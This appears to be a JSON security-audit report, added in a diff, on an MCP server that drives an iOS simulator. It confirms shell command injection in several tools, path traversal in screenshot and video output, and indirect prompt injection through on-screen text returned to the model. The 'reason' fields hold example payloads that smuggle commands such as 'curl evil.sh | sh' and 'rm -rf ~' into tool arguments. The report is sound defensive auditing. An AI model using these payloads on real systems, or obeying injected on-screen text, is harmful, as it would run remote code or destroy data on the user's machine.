@@ -1,0 +1,250 @@
+[
+ {
+  "rule": "CMD-INJECTION",
+  "severity": "critical",
+  "file": "src/index.ts",
+  "line": 140,
+  "quote": "const { stdout } = await execAsync(",
+  "message": "Tool input reaches a dangerous call: a helper that runs its argument through a shell (exec).",
+  "confidence": "high",
+  "owasp": "ASI05 Unexpected Code Execution",
+  "fix": "Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.",
+  "source_line": 127,
+  "source_quote": "server.tool(",
+  "id": "F001",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 136,
+    "quote": "async ({ udid }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 141,
+    "quote": "`idb ui describe-all --udid ${actualUdid} --json --nested`"
+   }
+  ],
+  "reason": "udid is a free string pasted into a shell command run by exec; udid='x; curl evil.sh | sh' runs arbitrary commands on the developer's Mac.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "severity": "critical",
+  "file": "src/index.ts",
+  "line": 182,
+  "quote": "const { stderr } = await execAsync(",
+  "message": "Tool input reaches a dangerous call: a helper that runs its argument through a shell (exec).",
+  "confidence": "high",
+  "owasp": "ASI05 Unexpected Code Execution",
+  "fix": "execFile with an argument array; make duration z.number() and validate udid with a regex.",
+  "source_line": 166,
+  "source_quote": "server.tool(",
+  "id": "F002",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 178,
+    "quote": "async ({ duration, udid, x, y }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 181,
+    "quote": "const durationArg = duration ? `--duration ${duration}` : \"\";"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 183,
+    "quote": "`idb ui tap --udid ${actualUdid} ${durationArg} ${x} ${y}  --json`"
+   }
+  ],
+  "reason": "duration and udid are free strings interpolated into an exec() shell command; duration='1; rm -rf ~' runs.",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "severity": "critical",
+  "file": "src/index.ts",
+  "line": 223,
+  "quote": "const { stderr } = await execAsync(",
+  "message": "Tool input reaches a dangerous call: a helper that runs its argument through a shell (exec).",
+  "confidence": "high",
+  "owasp": "ASI05 Unexpected Code Execution",
+  "fix": "execFile('idb', ['ui', 'text', '--udid', udid, '--', text]).",
+  "source_line": 210,
+  "source_quote": "server.tool(",
+  "id": "F003",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 220,
+    "quote": "async ({ udid, text }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 224,
+    "quote": "`idb ui text ${text} --udid ${actualUdid}`"
+   }
+  ],
+  "reason": "text (the string to type, which naturally contains user/page content) is pasted unquoted into a shell command; text='$(curl evil|sh)' executes.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "severity": "critical",
+  "file": "src/index.ts",
+  "line": 317,
+  "quote": "const { stdout, stderr } = await execAsync(",
+  "message": "Tool input reaches a dangerous call: a helper that runs its argument through a shell (exec).",
+  "confidence": "high",
+  "owasp": "ASI05 Unexpected Code Execution",
+  "fix": "Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.",
+  "source_line": 303,
+  "source_quote": "server.tool(",
+  "id": "F004",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 314,
+    "quote": "async ({ udid, x, y }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 318,
+    "quote": "`idb ui describe-point --udid ${actualUdid} ${x} ${y} --json`"
+   }
+  ],
+  "reason": "udid string reaches an exec() shell command unescaped (x, y are numbers).",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "ARG-INJECTION",
+  "severity": "info",
+  "file": "src/index.ts",
+  "line": 488,
+  "quote": "const recordingProcess = spawn(\"xcrun\", args);",
+  "message": "Tool input reaches a dangerous call: a program is started with arguments taken from tool input.",
+  "confidence": "high",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "See M003.",
+  "source_line": 437,
+  "source_quote": "server.tool(",
+  "id": "F005",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 475,
+    "quote": "const outputFile = ensureAbsolutePath(output_path ?? defaultFileName);"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 488,
+    "quote": "const recordingProcess = spawn(\"xcrun\", args);"
+   }
+  ],
+  "reason": "spawn uses an argument array (no shell); the only free value is outputFile, which ensureAbsolutePath always turns into an absolute path (starts with '/'), so it cannot be read as an option. codec/display/mask are enums. The unrestricted write location is reported as M003.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "ui_swipe passes udid into a shell command",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 271,
+    "quote": "async ({ udid, x_start, y_start, x_end, y_end, delta }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 276,
+    "quote": "`idb ui swipe --udid ${actualUdid} ${deltaArg} ${x_start} ${y_start} ${x_end} ${y_end} --json`"
+   }
+  ],
+  "reason": "Scanner missed this one: udid is a free string interpolated into an exec() shell command, same as F001.",
+  "fix": "Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.",
+  "id": "M001",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "CMD-INJECTION",
+  "title": "screenshot passes output_path and udid into a shell command",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 391,
+    "quote": "async ({ udid, output_path, type, display, mask }) => {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 396,
+    "quote": "let command = `xcrun simctl io ${actualUdid} screenshot ${absolutePath}`;"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 403,
+    "quote": "const { stderr: stdout } = await execAsync(command);"
+   }
+  ],
+  "reason": "Scanner missed this one: output_path='/tmp/a.png; curl evil.sh | sh' stays 'absolute' through ensureAbsolutePath and is run by exec() in a shell.",
+  "fix": "execFile('xcrun', ['simctl', 'io', udid, 'screenshot', ...flags, absolutePath]) and validate udid.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "screenshot / record_video write to any path (record_video can overwrite with force)",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 344,
+    "quote": "function ensureAbsolutePath(filePath: string): string {"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 346,
+    "quote": "return filePath;"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 475,
+    "quote": "const outputFile = ensureAbsolutePath(output_path ?? defaultFileName);"
+   },
+   {
+    "file": "src/index.ts",
+    "line": 483,
+    "quote": "if (force) args.push(\"--force\");"
+   }
+  ],
+  "reason": "Absolute paths and '../' are accepted as-is, so a steered model can write or (with force=true) overwrite any file the user can write, e.g. ~/.zshrc, with image/video bytes.",
+  "fix": "Resolve the path and require it to stay inside a configured output folder (default ~/Downloads); drop the force flag or require confirmation.",
+  "id": "M003",
+  "quotes_verified": 4
+ },
+ {
+  "rule": "INDIRECT-INJECTION",
+  "title": "Accessibility text from the simulator returned raw to the model",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/index.ts",
+    "line": 146,
+    "quote": "content: [{ type: \"text\", text: stdout }],"
+   }
+  ],
+  "reason": "ui_describe_all returns all on-screen labels/text (which can include web or app content written by others) unmarked into the model context, and the same server has shell-reaching tools above.",
+  "fix": "Mark the output as untrusted data; fixing F001-F004/M001-M002 removes the dangerous follow-up.",
+  "id": "M004",
+  "quotes_verified": 1
+ }
+]
